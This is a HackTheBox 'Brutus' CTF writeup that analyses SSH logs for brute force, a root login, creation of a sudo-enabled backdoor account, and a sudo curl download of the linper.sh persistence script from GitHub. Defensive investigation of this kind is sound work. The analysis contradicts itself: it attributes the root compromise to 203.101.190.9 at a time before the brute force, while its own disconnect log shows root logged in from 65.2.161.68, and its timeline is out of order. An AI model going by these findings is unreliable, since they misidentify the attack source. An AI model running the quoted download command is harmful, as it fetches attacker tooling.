---
title: "Brutus"
description: "Log analysis investigation of SSH brute force attacks, successful authentication bypass, privilege escalation, and persistence mechanisms through backdoor account creation."
date: "2025-09-08"
difficulty: "Medium"
tags:
  - SSH Brute Force
  - Log Analysis
  - Privilege Escalation
  - Account Creation
  - Persistence Techniques
  - Linux Security
  - Authentication Bypass
platform: "HackTheBox"
tools:
  - SSH Logs Analysis
  - Linux System Logs
  - Authentication Monitoring
  - Session Tracking
references:
  - https://attack.mitre.org/techniques/T1136/001/
  - https://attack.mitre.org/techniques/T1110/
  - https://attack.mitre.org/techniques/T1078/
slug: hackthebox-brutus-ssh-brute-force-analysis
---

# HackTheBox - Brutus CTF Writeup

## Overview

This writeup covers the analysis of SSH authentication logs and system activity logs in the Brutus challenge. The investigation focuses on identifying brute force attacks, successful authentication attempts, privilege escalation, and persistence techniques employed by an attacker.

## Challenge Analysis

### Initial Attack Vector - SSH Brute Force Attack

The investigation begins with analyzing authentication logs that reveal a clear pattern of brute force attacks against the SSH service. Multiple authentication failures were observed from the IP address `65.2.161.68`:

```
Mar 6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): check pass; user unknown
Mar 6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
Mar 6 06:31:31 ip-172-31-35-28 sshd[2335]: pam_unix(sshd:auth): check pass; user unknown
Mar 6 06:31:31 ip-172-31-35-28 sshd[2335]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
```

The logs show repeated authentication failures and attempts against various usernames including `admin` and `backup`:

```
Mar 6 06:31:31 ip-172-31-35-28 sshd[2334]: Invalid user admin from 65.2.161.68 port 46454
Mar 6 06:31:31 ip-172-31-35-28 sshd[2329]: Invalid user admin from 65.2.161.68 port 46414
Mar 6 06:31:31 ip-172-31-35-28 sshd[2338]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 user=backup
```

**Analysis:** The authentication failure patterns clearly indicate a brute force attack originating from IP address `65.2.161.68`, targeting multiple user accounts in an attempt to gain unauthorized access.

### Successful Authentication and Initial Access

Despite the failed brute force attempts from `65.2.161.68`, the attacker successfully gained access to the system using a different IP address:

```
Mar 6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar 6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
```

**Key Finding:** The attacker successfully accessed the root account from IP address `203.101.190.9` using password authentication, indicating that the brute force attack may have been a diversionary tactic or the attacker possessed valid credentials for the root account.

### Session Tracking and System Access

Following successful authentication, the system assigned session tracking information:

```
Mar 6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

**Answer:** The session number assigned to the root login was **37**.

### Persistence Mechanism - Account Creation

As part of their persistence strategy, the attacker created a new user account to maintain long-term access to the compromised system:

```
Mar 6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar 6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
```

**Analysis:** The attacker created a new user account named `cyberjunkie` as part of their persistence strategy on the server. This technique aligns with MITRE ATT&CK framework subtechnique **T1136.001** (Create Account: Local Account).

### Privilege Escalation

The attacker elevated the privileges of the newly created account by adding it to administrative groups:

```
Mar 6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

**Key Finding:** The attacker gave the new user account `cyberjunkie` higher privileges by adding it to both the `sudo` group and the shadow `sudo` group, effectively granting administrative access.

### Tool Download and Lateral Movement Preparation

Using the backdoor account with elevated privileges, the attacker downloaded additional tools:

```
Mar 6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Analysis:** The attacker logged in with their backdoor account `cyberjunkie` and used sudo privileges to download a script from GitHub (`linper.sh` from the montysecurity repository). This tool likely serves for further system enumeration or lateral movement within the network.

### Session Termination and Cleanup

After completing the initial compromise and establishing persistence, the attacker disconnected from the system:

```
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar 6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar 6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

**Final Step:** The attacker then disconnected from the system, completing the initial compromise phase while maintaining persistent access through the created backdoor account.

## Attack Timeline Summary

1. **06:31:31** - Brute force attack attempts from `65.2.161.68`
2. **06:19:54** - Successful root login from `203.101.190.9`
3. **06:32:44** - Session 37 established for root user
4. **06:35:15** - Creation and privilege escalation of `cyberjunkie` account
5. **06:37:34** - New session 49 for `cyberjunkie` user
6. **06:39:38** - Tool download using elevated privileges
7. **06:37:24** - Attacker disconnection and session cleanup

## MITRE ATT&CK Techniques Identified

- **T1136.001** - Create Account: Local Account (cyberjunkie user creation)
- **T1110** - Brute Force (SSH authentication attempts)
- **T1078** - Valid Accounts (successful root authentication)
- **T1548.003** - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

## Key Findings and Indicators

1. **Primary Attack Vector:** SSH brute force followed by successful authentication
2. **Compromised Session:** Root session number 37
3. **Persistence Mechanism:** Creation of `cyberjunkie` backdoor account
4. **Privilege Escalation:** Addition to sudo groups for administrative access
5. **Tool Acquisition:** Download of `linper.sh` reconnaissance script
6. **Attack IPs:** `65.2.161.68` (brute force) and `203.101.190.9` (successful login)

## Defensive Recommendations

1. Implement fail2ban or similar intrusion prevention systems
2. Enforce strong password policies and multi-factor authentication
3. Monitor and alert on rapid account creation activities
4. Implement privilege escalation monitoring
5. Regularly audit user accounts and group memberships
6. Monitor outbound connections for tool downloads

This analysis demonstrates a sophisticated multi-stage attack involving initial access, persistence establishment, and preparation for further network compromise activities.